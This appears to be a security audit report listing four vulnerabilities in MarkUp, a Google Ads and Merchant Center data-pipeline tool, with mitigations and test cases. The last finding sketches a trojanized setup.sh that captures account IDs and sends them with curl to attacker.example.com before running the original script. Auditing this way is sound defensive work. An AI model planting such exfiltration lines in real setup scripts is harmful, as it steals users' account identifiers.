## Combined Vulnerability List

This document outlines the identified vulnerabilities within the MarkUp project. Each vulnerability is detailed with its description, potential impact, severity ranking, current mitigations, missing mitigations, preconditions, source code analysis, and a security test case.

### Information Disclosure through Publicly Shared Data Studio Dashboards

- **Description:**
    1. A user installs MarkUp, automating data transfers from Google Merchant Center and Google Ads to BigQuery.
    2. The user creates Data Studio dashboards using provided templates, connecting them to BigQuery datasets.
    3. The user misconfigures dashboard sharing settings to "Public on the web", making it accessible without authentication.
    4. An attacker discovers the public link (e.g., via search engine indexing).
    5. The attacker accesses the dashboard and views sensitive Google Merchant Center and Google Ads performance data without credentials.
- **Impact:**
    Exposure of sensitive business data (product performance, advertising costs, revenue, competitive insights) leading to:
      - Competitive disadvantage
      - Loss of customer trust
      - Regulatory compliance issues
      - Financial loss
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Deprecation Notice: The project `README.md` states "This tool is deprecated", discouraging new users. This is a weak mitigation as existing users remain vulnerable.
- **Missing Mitigations:**
    - Security Warning Documentation: Lack of explicit documentation warning users about risks of public sharing and instructions for secure sharing in Data Studio.
    - Best Practices Guide: Absence of a guide on data anonymization or aggregation for dashboards intended for broader sharing.
    - In-Template Security Reminders: No reminders within Data Studio templates to secure sharing settings upon creation.
- **Preconditions:**
    - Successful MarkUp installation.
    - Data Studio dashboard creation from templates.
    - Dashboard sharing misconfiguration to "Public on the web".
    - Attacker discovery of the public dashboard URL.
- **Source Code Analysis:**
    - The source code automates cloud resource deployment and data pipelines but does not manage Data Studio sharing settings.
    - `README.md`: Provides links to Data Studio templates, indirectly contributing to the vulnerability by facilitating dashboard creation. Deprecation notice is a weak mitigation.
    - Other scripts (`setup.sh`, `cloud_env_setup.py`, etc.) focus on data infrastructure setup and do not address Data Studio configuration.
    - The vulnerability is a misconfiguration issue in Data Studio, enabled by the tool but outside its codebase control.
- **Security Test Case:**
    1. **Setup:** Deploy MarkUp with test Google Merchant Center/Ads data.
    2. **Dashboard Creation:** Create Data Studio dashboards from templates.
    3. **Sharing Misconfiguration:** Set one dashboard to "Public on the web", obtain public URL.
    4. **Attacker Access Simulation:** Open a browser session without GCP/Google account login.
    5. **Verification:** Access the public URL, verify data access without authentication.
    6. **Observe Data Access:** Confirm access to Google Merchant Center/Ads data.
    7. **Remediation Test (Documentation):** (If documentation is created) Follow secure sharing instructions and verify "Public on the web" link is no longer functional.

### Data Redirection via Malicious Script Modification

- **Description:**
    1. Attacker socially engineers user to download modified `setup.sh` script.
    2. Modified script replaces user's GCP Project ID with attacker's GCP Project ID in configuration.
    3. User executes modified `setup.sh`, providing their Google Merchant Center and Google Ads IDs.
    4. Script configures data transfers to the attacker's GCP project instead of the user's intended project.
    5. Data is transferred to and stored within the attacker's Google Cloud project.
- **Impact:**
    - Confidentiality Breach: Sensitive data exfiltrated to attacker's GCP project.
    - Data Loss for legitimate user: User's data not stored in their intended project.
    - Potential further malicious activities: Data used for competitive advantage, sale, or further attacks.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - Deprecation Notice: `README.md` deprecation notice discourages new users.
    - Disclaimer: `README.md` disclaimer "This is not an officially supported Google product." warns users about potential risks.
- **Missing Mitigations:**
    - Input Validation: Lack of validation for project ID and other user inputs in `setup.sh` and `cloud_env_setup.py`.
    - Integrity Checks: No mechanism to verify integrity of `setup.sh` or `cloud_env_setup.py` before execution.
    - Secure Distribution: Distribution via public GitHub without secure channel for verifying script legitimacy.
    - User Awareness Training: No warnings about social engineering risks of running scripts from public repositories.
- **Preconditions:**
    - User downloads MarkUp from public GitHub.
    - Attacker distributes modified MarkUp tool (e.g., phishing).
    - User is tricked into running attacker's modified `setup.sh`.
    - User has credentials for Google Merchant Center, Google Ads, and some GCP project.
- **Source Code Analysis:**
    1. `setup.sh`: Entry point, passes arguments to `cloud_env_setup.py` without sanitization. `python cloud_env_setup.py "$@"`
    2. `cloud_env_setup.py`: Uses `argparse` to parse `--project_id`, `--merchant_id`, etc. `args.project_id` is used to initialize `CloudDataTransferUtils`.
    ```python
    parser = argparse.ArgumentParser()
    parser.add_argument('--project_id', help='GCP project id.', required=True)
    ...
    args = parser.parse_args()
    data_transfer = cloud_data_transfer.CloudDataTransferUtils(args.project_id)
    ```
    3. `cloud_data_transfer.py`: `CloudDataTransferUtils` stores `project_id` and uses it in API calls for data transfer creation.
    ```python
    class CloudDataTransferUtils(object):
      def __init__(self, project_id: str):
        self.project_id = project_id
        ...
      def create_merchant_center_transfer(...):
          parent = 'projects/' + self.project_id + '/locations/' + dataset_location
          request = bigquery_datatransfer.CreateTransferConfigRequest(parent=parent, ...)
          ...
    ```
    - No validation of `project_id`. Attacker control over `project_id` redirects data transfer.
- **Security Test Case:**
    1. **Setup Attacker Environment:** Create attacker-controlled GCP project.
    2. **Modify `setup.sh`:** Modify `cloud_env_setup.py` to hardcode attacker's project ID, bypassing command-line argument.
    ```python
    def main():
      args = parse_arguments()
      data_transfer = cloud_data_transfer.CloudDataTransferUtils('attacker-project-id') # Modified
      ...
    ```
    3. **Social Engineering:** Trick test user into running modified `setup.sh`.
    4. **User Execution:** Test user runs modified script with their Merchant Center/Ads IDs and intended GCP project ID.
    5. **Observe Data Transfer:** Check attacker's GCP project for data. Check victim's project - no data.
    6. **Verification:** Data in attacker's project, not victim's, confirms vulnerability.

### Data Visualization Manipulation through Malicious Data Injection

- **Description:**
    1. Attacker compromises Google Merchant Center or Google Ads account connected to MarkUp.
    2. Attacker injects malicious data into the compromised account (e.g., fabricated metrics, altered product attributes).
    3. MarkUp transfers data to BigQuery datasets.
    4. MarkUp scripts and SQL queries process data without validation, incorporating malicious data.
    5. Data Studio dashboards visualize manipulated data, misleading users.
- **Impact:**
    - Misleading Business Decisions: Decisions based on incorrect data.
    - Reputational Damage: Damage from poor business outcomes due to incorrect data.
    - Loss of Trust: Loss of trust in the MarkUp tool.
- **Vulnerability Rank:** High
- **Currently Implemented Mitigations:**
    - None. Project assumes trustworthy input data from Google Merchant Center/Ads. No input validation.
- **Missing Mitigations:**
    - Input Validation and Sanitization: Validate and sanitize data from GMC/Ads: data type validation, range checks, string sanitization.
    - Data Source Authentication and Authorization: Continuous monitoring of connected GMC/Ads accounts security.
    - Data Integrity Monitoring: Anomaly detection for suspicious data patterns.
- **Preconditions:**
    - Attacker access to GMC or Google Ads account connected to MarkUp.
    - MarkUp setup and running, data transfers configured.
- **Source Code Analysis:**
    - Code focuses on data pipelines and BigQuery views, assumes data trustworthiness.
    - `cloud_data_transfer.py`, `cloud_bigquery.py`, SQL scripts process data.
    - **Absence of Validation:** No input validation in Python or SQL.
    - **Data Flow:** GMC/Ads -> BigQuery Data Transfer -> BigQuery datasets -> Data Studio. Lack of checks at BigQuery dataset entry.
    - **Example:** `cloud_bigquery.py` executes SQL queries from `scripts` directory. SQL scripts operate on GMC/Ads data without validation. Malicious data propagates through pipeline.
- **Security Test Case:**
    1. **Setup MarkUp:** Install and configure MarkUp with GMC/Ads accounts.
    2. **Compromise Source Account (Simulated):** Access test GMC account.
    3. **Inject Malicious Data in GMC:** Modify product data in GMC (long title, unrealistic price, special characters).
    4. **Wait for Data Transfer:** Wait for data transfer to BigQuery.
    5. **Observe Data Studio Dashboards:** Check dashboards for anomalies, misleading insights from injected data (broken charts, wrong values).
    6. **Verify in BigQuery:** Query BigQuery tables to confirm malicious data presence.
    7. **Document Findings:** Document dashboard anomalies and malicious data in BigQuery.

### Data Exfiltration via Modified Setup Script

- **Description:**
    1. Attacker creates modified `setup.sh` to exfiltrate sensitive information.
    2. Modified script includes commands to capture command-line arguments (`project_id`, `merchant_id`, `ads_customer_id`).
    3. Attacker uses social engineering to trick retailer into running compromised script.
    4. Modified script exfiltrates captured data to attacker-controlled server.
    5. Script then executes original `setup.sh` logic, masking compromise.
- **Impact:**
    - Exposure of GCP Project ID, Google Merchant Center ID, and Google Ads Customer ID.
    - Allows attacker to target retailer's Google accounts for further attacks.
    - Enables potential further attacks aimed at data exfiltration or account compromise.
- **Vulnerability Rank:** Medium
- **Currently Implemented Mitigations:**
    - None. No measures to prevent modified script execution or verify `setup.sh` integrity.
- **Missing Mitigations:**
    - Integrity Checks: Checksums or digital signatures for `setup.sh`.
    - Secure Distribution: Provide `setup.sh` via secure channel, advise downloading from official repo and verifying source.
    - User Warnings: Warn about risks of running scripts from untrusted sources and importance of script integrity verification.
    - Input Validation (Limited Mitigation): Input validation in Python scripts can mitigate some downstream risks after initial access.
- **Preconditions:**
    - Social engineering to convince retailer to run modified `setup.sh`.
    - Retailer provides valid GCP Project ID, Google Merchant Center ID, and Google Ads Customer ID as arguments.
- **Source Code Analysis:**
    1. **`setup.sh` script:** Entry point, executes `python cloud_env_setup.py "$@"`.
    ```bash
    #!/bin/bash
    ...
    python cloud_env_setup.py "$@"
    ```
    2. **Vulnerability Point:** Lack of integrity checks on `setup.sh`.
    3. **Malicious Modification Example:** Modified `setup.sh` to exfiltrate command-line arguments before original logic:
    ```bash
    #!/bin/bash
    # Modified setup.sh

    PROJECT_ID=$(echo "$@" | awk ...)
    MERCHANT_ID=$(echo "$@" | awk ...)
    ADS_CUSTOMER_ID=$(echo "$@" | awk ...)

    curl "https://attacker.example.com/exfiltrate?..."

    # Original setup.sh content starts here
    ...
    python cloud_env_setup.py "$@"
    ```
    4. **Execution Flow:** Modified script exfiltrates data first, then runs original script, masking malicious activity.
- **Security Test Case:**
    1. **Setup Attacker Server:** Setup HTTP server to listen for requests (e.g., `attacker.example.com`).
    2. **Modify `setup.sh`:** Add malicious code from Source Code Analysis to `setup.sh` to exfiltrate arguments to attacker server.
    ```bash
    #!/bin/bash
    # Modified setup.sh
    ...
    curl "http://attacker.example.com/exfiltrate?..."
    ...
    python cloud_env_setup.py "$@"
    ```
    3. **Victim Execution:** Run modified `setup.sh` with valid parameters:
    ```bash
    sh setup.sh --project_id=... --merchant_id=... --ads_customer_id=... --market_insights=False
    ```
    4. **Verify Exfiltration:** Check attacker server logs for HTTP GET request to `/exfiltrate` with parameters.
    5. **Observe Normal Execution (Optional):** Verify rest of `setup.sh` executes normally.